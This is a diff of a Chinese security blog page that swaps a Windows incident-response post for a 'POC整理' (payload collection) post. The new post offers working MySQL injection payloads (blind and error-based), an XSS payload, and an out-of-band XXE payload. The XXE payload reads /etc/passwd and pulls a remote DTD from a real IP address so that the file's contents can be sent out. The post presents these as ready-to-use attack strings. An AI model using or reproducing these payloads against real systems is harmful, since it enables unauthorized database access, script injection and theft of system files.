@@ -7,7 +7,7 @@
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
   
-  <title>windows应急 | Hexo</title>
+  <title>poc整理 | Hexo</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -15,17 +15,17 @@
     <meta name="keywords" content="web安全，app安全，咸鱼">
   
 
-  <meta name="description" content="window应急响应应急响应是安全的一个非常重要的点，应急响应是为了在事故发生之后降低损失，排查攻击路径以方便修复以防被再次攻击，甚至追踪到攻击者追责。 基础排查账号排查命令输入lusrmgr.msc打开账户组情况 HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\注册表系统账号排查 异常端口netstat -ano排查端口查看端口是否有连接一些异常">
+  <meta name="description" content="POC整理这里整理一些poc方便平时查询与使用 sql1234567891011121314151617常用字段:database()               //获取当前数据库version()                //获取数据库版本user()                   //获取用户@@datadir                //获取数据库路径@@version_">
 <meta property="og:type" content="article">
-<meta property="og:title" content="windows应急">
-<meta property="og:url" content="http://yoursite.com/2019/09/29/windows应急/index.html">
+<meta property="og:title" content="poc整理">
+<meta property="og:url" content="http://yoursite.com/2019/10/14/poc整理/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="window应急响应应急响应是安全的一个非常重要的点，应急响应是为了在事故发生之后降低损失，排查攻击路径以方便修复以防被再次攻击，甚至追踪到攻击者追责。 基础排查账号排查命令输入lusrmgr.msc打开账户组情况 HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\注册表系统账号排查 异常端口netstat -ano排查端口查看端口是否有连接一些异常">
+<meta property="og:description" content="POC整理这里整理一些poc方便平时查询与使用 sql1234567891011121314151617常用字段:database()               //获取当前数据库version()                //获取数据库版本user()                   //获取用户@@datadir                //获取数据库路径@@version_">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-10-08T08:50:54.736Z">
+<meta property="og:updated_time" content="2019-10-14T06:04:39.695Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="windows应急">
-<meta name="twitter:description" content="window应急响应应急响应是安全的一个非常重要的点，应急响应是为了在事故发生之后降低损失，排查攻击路径以方便修复以防被再次攻击，甚至追踪到攻击者追责。 基础排查账号排查命令输入lusrmgr.msc打开账户组情况 HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\注册表系统账号排查 异常端口netstat -ano排查端口查看端口是否有连接一些异常">
+<meta name="twitter:title" content="poc整理">
+<meta name="twitter:description" content="POC整理这里整理一些poc方便平时查询与使用 sql1234567891011121314151617常用字段:database()               //获取当前数据库version()                //获取数据库版本user()                   //获取用户@@datadir                //获取数据库路径@@version_">
 
   
 
@@ -184,20 +184,20 @@ ga('send', 'pageview');
 
   <div id="toc" class="toc-article">
     <strong class="toc-title">Posts List</strong>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#window应急响应"><span class="toc-text">window应急响应</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#基础排查"><span class="toc-text">基础排查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#账号排查"><span class="toc-text">账号排查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#异常端口"><span class="toc-text">异常端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#进程检查"><span class="toc-text">进程检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#检查启动项"><span class="toc-text">检查启动项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#检查计划任务"><span class="toc-text">检查计划任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#检查服务器自启动"><span class="toc-text">检查服务器自启动</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#日志"><span class="toc-text">日志</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#POC整理"><span class="toc-text">POC整理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql"><span class="toc-text">sql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xxe"><span class="toc-text">xxe</span></a></li></ol></li></ol>
   </div>
 
 
 
 <div class="content content-post CENTER">
-   <article id="post-windows应急" class="article article-type-post" itemprop="blogPost">
+   <article id="post-poc整理" class="article article-type-post" itemprop="blogPost">
   <header class="article-header">
-    <h1 class="post-title">windows应急</h1>
+    <h1 class="post-title">poc整理</h1>
 
     <div class="article-meta">
       <span>
         <i class="icon-calendar"></i>
-        <span>2019.09.29</span>
+        <span>2019.10.14</span>
       </span>
 
       
@@ -225,86 +225,13 @@ ga('send', 'pageview');
 
   <div class="article-content">
     
-      <h1 id="window应急响应"><a href="#window应急响应" class="headerlink" title="window应急响应"></a>window应急响应</h1><p>应急响应是安全的一个非常重要的点，应急响应是为了在事故发生之后降低损失，排查攻击路径以方便修复以防被再次攻击，甚至追踪到攻击者追责。</p>
-<h2 id="基础排查"><a href="#基础排查" class="headerlink" title="基础排查"></a>基础排查</h2><h3 id="账号排查"><a href="#账号排查" class="headerlink" title="账号排查"></a>账号排查</h3><p>命令输入lusrmgr.msc打开账户组情况</p>
-<p>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\注册表系统账号排查</p>
-<h3 id="异常端口"><a href="#异常端口" class="headerlink" title="异常端口"></a>异常端口</h3><p>netstat -ano排查端口查看端口是否有连接一些异常的IP</p>
-<p>tasklist  | findstr “PID”查看开启连接的文件</p>
-<h3 id="进程检查"><a href="#进程检查" class="headerlink" title="进程检查"></a>进程检查</h3><p>命令行打开msinfo32，检查意外中的进程。</p>
-<h3 id="检查启动项"><a href="#检查启动项" class="headerlink" title="检查启动项"></a>检查启动项</h3><h3 id="检查计划任务"><a href="#检查计划任务" class="headerlink" title="检查计划任务"></a>检查计划任务</h3><h3 id="检查服务器自启动"><a href="#检查服务器自启动" class="headerlink" title="检查服务器自启动"></a>检查服务器自启动</h3><h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><p>eventvwr.msc打开日志功能</p>
-<p>常见事件ID与对应事件</p>
-<table>
-<thead>
-<tr>
-<th align="left">事件ID</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">1102</td>
-<td align="left">清理审计日志</td>
-</tr>
-<tr>
-<td align="left">4624</td>
-<td align="left">账号成功登录</td>
-</tr>
-<tr>
-<td align="left">4625</td>
-<td align="left">账号登录失败</td>
-</tr>
-<tr>
-<td align="left">4768</td>
-<td align="left">Kerberos身份验证（TGT请求）</td>
-</tr>
-<tr>
-<td align="left">4769</td>
-<td align="left">Kerberos服务票证请求</td>
-</tr>
-<tr>
-<td align="left">4776</td>
-<td align="left">NTLM身份验证</td>
-</tr>
-<tr>
-<td align="left">4672</td>
-<td align="left">授予特殊权限</td>
-</tr>
-<tr>
-<td align="left">4720</td>
-<td align="left">创建用户</td>
-</tr>
-<tr>
-<td align="left">4726</td>
-<td align="left">删除用户</td>
-</tr>
-<tr>
-<td align="left">4728</td>
-<td align="left">将成员添加到启用安全的全局组中</td>
-</tr>
-<tr>
-<td align="left">4729</td>
-<td align="left">将成员从安全的全局组中移除</td>
-</tr>
-<tr>
-<td align="left">4732</td>
-<td align="left">将成员添加到启用安全的本地组中</td>
-</tr>
-<tr>
-<td align="left">4733</td>
-<td align="left">将成员从启用安全的本地组中移除</td>
-</tr>
-<tr>
-<td align="left">4756</td>
-<td align="left">将成员添加到启用安全的通用组中</td>
-</tr>
-<tr>
-<td align="left">4757</td>
-<td align="left">将成员从启用安全的通用组中移除</td>
-</tr>
-<tr>
-<td align="left">4719</td>
-<td align="left">系统审计策略修改</td>
-</tr>
-</tbody></table>
+      <h1 id="POC整理"><a href="#POC整理" class="headerlink" title="POC整理"></a>POC整理</h1><p>这里整理一些poc方便平时查询与使用</p>
+<h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">常用字段:</span><br><span class="line">database()               //获取当前数据库</span><br><span class="line">version()                //获取数据库版本</span><br><span class="line">user()                   //获取用户</span><br><span class="line">@@datadir                //获取数据库路径</span><br><span class="line">@@version_compile_os     //获取操作系统</span><br><span class="line">@@basedir                //mysql安装路径</span><br><span class="line">session_user()           //获取连接数据库的用户名</span><br><span class="line">current_user()           //获取当前用户名</span><br><span class="line">system_user()            //获取系统用户名</span><br><span class="line">盲注:</span><br><span class="line">bool:</span><br><span class="line">and ((select ascii(substr(database(),&quot;从第m个字符开始截取&quot;,&quot;截取长度&quot;)))&gt;&quot;ascii值&quot;)</span><br><span class="line">时间盲注:</span><br><span class="line">if(ascii(substr((user()),1,1))=115,true,false)</span><br><span class="line">报错注入:</span><br><span class="line">and(updatexml(1,concat(0x7e,(select database())),0));</span><br></pre></td></tr></table></figure>
+
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://120.79.91.29/evil.dtd&quot;&gt;</span><br><span class="line">%remote;%all;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;foo&gt;</span><br><span class="line">    &lt;code&gt;&amp;send;&lt;/code&gt;</span><br><span class="line">    &lt;msg&gt;mypass&lt;/msg&gt;</span><br><span class="line">&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
+
 
     
   </div>
@@ -316,10 +243,10 @@ ga('send', 'pageview');
 
    
   <div class="box-prev-next clearfix">
-    <a class="show pull-left" href="/2019/09/23/web容器漏洞/">
+    <a class="show pull-left" href="/2019/09/29/windows应急/">
         <i class="icon icon-angle-left"></i>
     </a>
-    <a class="show pull-right" href="/2019/10/14/poc整理/">
+    <a class="hide pull-right" href="/">
         <i class="icon icon-angle-right"></i>
     </a>
   </div>
